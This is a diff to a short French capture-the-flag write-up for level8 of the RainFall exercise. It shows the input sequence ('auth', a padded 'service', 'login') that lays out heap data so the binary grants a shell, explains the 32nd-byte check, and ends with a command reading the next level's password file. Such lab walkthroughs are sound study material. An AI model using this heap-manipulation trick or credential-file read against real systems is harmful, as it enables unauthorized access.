@@ -1,9 +1,19 @@
+Bon, apres avoir epluché le main dans gdb on comprends qu'il faut faire:
+
 level8@RainFall:~$ ./level8
 (nil), (nil)
 auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 0x804a008, (nil)
-serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 0x804a008, 0x804a018
 login
 $ ls
 ls: cannot open directory .: Permission denied
+
+voila on a un shell,
+alors pourquoi ca marche: le binaire verifie juste que lors du "login"
+le 32eme caractere ne soit pas un \0 ( ou du moin = a 0 (nuance typage variable))
+
+on finis par:
+cat /home/user/level9/.pass
+
